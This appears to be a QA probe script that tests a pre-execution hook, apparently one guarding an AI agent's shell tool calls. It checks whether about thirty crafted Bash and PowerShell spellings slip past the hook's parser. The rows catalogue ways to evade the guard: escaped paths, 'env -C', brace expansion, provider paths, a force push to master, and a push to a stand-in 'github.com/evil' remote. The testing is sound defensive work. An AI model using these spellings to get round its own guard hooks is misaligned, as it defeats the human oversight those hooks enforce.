// QA 237 (re-run) targeted probes, second set: spelling classes found by reading shell-words.ts / bash.ts / git.ts
// that neither the r5 property test nor probe-holes.mjs generates. Each row runs TWICE:
//   1. through the REAL built hook CLI with fixture stdin (lib.mjs; the hook is never registered), and
//   2. in the REAL shell (Git Bash, or Windows PowerShell 5.1) inside C:/qa-scratch/qa241-q237-shelltest, which is the oracle:
//      for a write row, did a file under open-brain/src change; for a gh/git row, what argv did the program receive.
// Usage: node probe-holes2.mjs <out.json>
import { spawnSync } from "node:child_process";
import { mkdirSync, rmSync, writeFileSync, readdirSync, existsSync } from "node:fs";
import { join } from "node:path";
import { makeFixture, runAll, bash, pwsh, write, FX } from "./lib.mjs";

const T = "C:/qa-scratch/qa241-q237-shelltest";
const BASH = "C:/Program Files/Git/bin/bash.exe";
const NL = "\n";
const posixOf = (p) => p.replace(/^([A-Za-z]):/, (_, d) => `/${d.toLowerCase()}`);
makeFixture();

// [id, tool, command(root), kind]   kind: "write" (oracle = file under open-brain/src written) or "argv"
const rows = [
  // ---- P1 Bash: backslash escapes an ordinary character (bash removes the backslash; the hook reads it as a slash)
  ["P1 bash `s\\rc` escape in target", "bash", () => `echo x > open-brain/s\\rc/x.ts`, "write"],
  ["P1 bash `open\\-brain` escape in cp dest", "bash", () => `cp a.ts open\\-brain/src/x.ts`, "write"],
  ["P1-only-if bash unquoted `open-brain\\src\\x.ts` (bash writes open-brainsrcx.ts in the root)", "bash", () => `echo x > open-brain\\src\\x.ts`, "write"],
  // ---- P1 Bash: null-sink test runs before normalisation
  ["P1 bash `/dev/../<root>/open-brain/src/x.ts`", "bash", (r) => `echo x > /dev/..${posixOf(r)}/open-brain/src/x.ts`, "write"],
  // ---- P1 Bash: wrappers whose options take a value put the writer out of command position
  ["P1 bash `nice -n 5 cp`", "bash", () => `nice -n 5 cp a.ts open-brain/src/x.ts`, "write"],
  ["P1 bash `env -u FOO cp`", "bash", () => `env -u FOO cp a.ts open-brain/src/x.ts`, "write"],
  // ---- P1 Bash: a directory change that is not cd/pushd/Set-Location
  ["P1 bash `env --chdir=open-brain/src cp ../../a.ts x.ts`", "bash", () => `env --chdir=open-brain/src cp ../../a.ts x.ts`, "write"],
  ["P1 bash `env -C open-brain/src tee x.ts`", "bash", () => `echo x | env -C open-brain/src tee x.ts > /dev/null`, "write"],
  // ---- P1 Bash: `<<` inside arithmetic opens a fake heredoc that swallows the next line
  ["P1 bash `$((1<<2))` then a write on the next line", "bash", () => `echo $((1<<2))${NL}cp a.ts open-brain/src/x.ts${NL}`, "write"],
  // ---- P1 file tool / PowerShell: drive-relative `C:path`
  ["P1 PS drive-relative `Set-Content C:open-brain/src/x.ts`", "ps", () => `Set-Content C:open-brain/src/x.ts x`, "write"],
  // ---- P3 PowerShell provider-qualified paths
  ["P3 PS `FileSystem::<root>\\open-brain\\src\\x.ts`", "ps", (r) => `Set-Content FileSystem::${r.replace(/\//g, "\\")}\\open-brain\\src\\x.ts x`, "write"],
  ["P3 PS `Microsoft.PowerShell.Core\\FileSystem::...`", "ps", (r) => `Set-Content -Path Microsoft.PowerShell.Core\\FileSystem::${r}/open-brain/src/x.ts -Value x`, "write"],
  // ---- P3 PowerShell: a QUOTED comma list is an array of targets
  ["P3 PS quoted comma list `-Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts'`", "ps", () => `Set-Content -Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts' -Value x`, "write"],
  // ---- P3 PowerShell: a grouping expression as the target
  ["P3 PS `-Path ('open-brain/src/x.ts')`", "ps", () => `Set-Content -Path ('open-brain/src/x.ts') -Value x`, "write"],
  // ---- P3 PowerShell: -Command spelled by an accepted prefix the hook does not list
  ["P3 PS `powershell -Comman \"Set-Content ...\"`", "ps", () => `powershell -NoProfile -Comman "Set-Content open-brain/src/x.ts x"`, "write"],
  // ---- P3 limit text: other cmdlets that write (the text lists only bash examples for 'other write commands')
  ["LIMIT PS `Export-Csv -Path open-brain/src/x.ts`", "ps", () => `Get-Date | Export-Csv -Path open-brain/src/x.ts`, "write"],
  // ---- P2 gh: words after gh that the shell rewrites into `pr` / `merge`
  ["P2 bash `gh pr m\\erge 2`", "bash", () => `gh pr m\\erge 2`, "argv"],
  ["P2 bash `gh pr \\<newline>merge 2`", "bash", () => `gh pr \\${NL}merge 2`, "argv"],
  ["P2 bash `gh pr $'merge' 2`", "bash", () => `gh pr $'merge' 2`, "argv"],
  ["P2 bash `gh pr {merge,} 2`", "bash", () => `gh pr {merge,} 2`, "argv"],
  ["P2 bash `X=merge; gh pr $X 2`", "bash", () => `X=merge; gh pr $X 2`, "argv"],
  ["P2 bash `gh $(echo pr) merge 2`", "bash", () => `gh $(echo pr) merge 2`, "argv"],
  // ---- P2b git: the same rewrites in the subcommand position
  ["P2b bash `git mer\\ge feature`", "bash", () => `git mer\\ge feature`, "argv"],
  ["P2b bash `git {merge,} feature`", "bash", () => `git {merge,} feature`, "argv"],
  ["P2b bash `git \\<newline>merge feature`", "bash", () => `git \\${NL}merge feature`, "argv"],
  ["P2b bash `git pu\\sh --force origin master`", "bash", () => `git pu\\sh --force origin master`, "argv"],
  // ---- P2b git from PowerShell: an unquoted comma list is an ARRAY, passed to a native program as separate args
  ["P2b PS `git push origin loop/x,master`", "ps", () => `git push origin loop/x,master`, "argv"],
  ["P2b PS `git push origin loop/x,--force`", "ps", () => `git push origin loop/x,--force`, "argv"],
  // ---- P2b ruling-2 text vs intent: `origin` redirected by an inline -c
  ["P2b bash `git -c remote.origin.url=https://github.com/evil/x push origin loop/x`", "bash", () => `git -c remote.origin.url=https://github.com/evil/x push origin loop/x`, "argv"],
];

// ---- hook verdicts
const cases = rows.map(([id, tool, cmd]) => ({ id, payload: tool === "bash" ? bash(cmd(FX)) : pwsh(cmd(FX)) }));
const hook = await runAll(cases);

// ---- the real shell
mkdirSync("C:/qa-tmp", { recursive: true });
writeFileSync("C:/qa-tmp/argv.js", "console.log(JSON.stringify(process.argv.slice(2)))\n");
function fresh() {
  rmSync(T, { recursive: true, force: true });
  mkdirSync(join(T, "open-brain", "src"), { recursive: true });
  writeFileSync(join(T, "a.ts"), "a\n");
}
function shell(tool, cmd, kind) {
  fresh();
  let c = cmd;
  if (kind === "argv") {
    // gh and git replaced by a program that prints the argv it was given; nothing reaches GitHub or a repo.
    if (tool === "bash") c = `gh() { node C:/qa-tmp/argv.js gh "$@"; }; git() { node C:/qa-tmp/argv.js git "$@"; }${NL}${cmd}`;
    // PowerShell: the program in git's place must be NATIVE, since an array argument is split only for a native program.
    else c = `function gh { node C:/qa-tmp/argv.js gh @args }; ${cmd.replace(/^git /, "node C:/qa-tmp/argv.js git ")}`;
  }
  const r = tool === "bash"
    ? spawnSync(BASH, ["-c", c], { cwd: T, encoding: "utf8", timeout: 60000 })
    : spawnSync("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command", c], { cwd: T, encoding: "utf8", timeout: 60000 });
  if (kind === "argv") return { argv: (r.stdout || "").trim(), stderr: (r.stderr || "").trim().slice(0, 200) };
  const w = readdirSync(join(T, "open-brain", "src"));
  const root = readdirSync(T).filter((f) => !["open-brain", "a.ts"].includes(f));
  return { wroteUnderSrc: w, otherFilesInRoot: root, exit: r.status, stderr: (r.stderr || "").trim().slice(0, 200) };
}

const out = {};
for (let k = 0; k < rows.length; k++) {
  const [id, tool, cmd, kind] = rows[k];
  const h = hook[k];
  const s = shell(tool, cmd(T), kind);
  out[id] = { tool, command: cmd(FX), hook: h.decision, reason: h.reason.slice(0, 300), shell: s };
  const truth = kind === "write" ? (s.wroteUnderSrc.length ? `WROTE src/${s.wroteUnderSrc.join(",")}` : `no src write; root+=${s.otherFilesInRoot.join(",")}`) : s.argv;
  console.log(`${h.decision.padEnd(5)} | ${truth.padEnd(48)} | ${id}`);
}
writeFileSync(process.argv[2], JSON.stringify(out, null, 1));
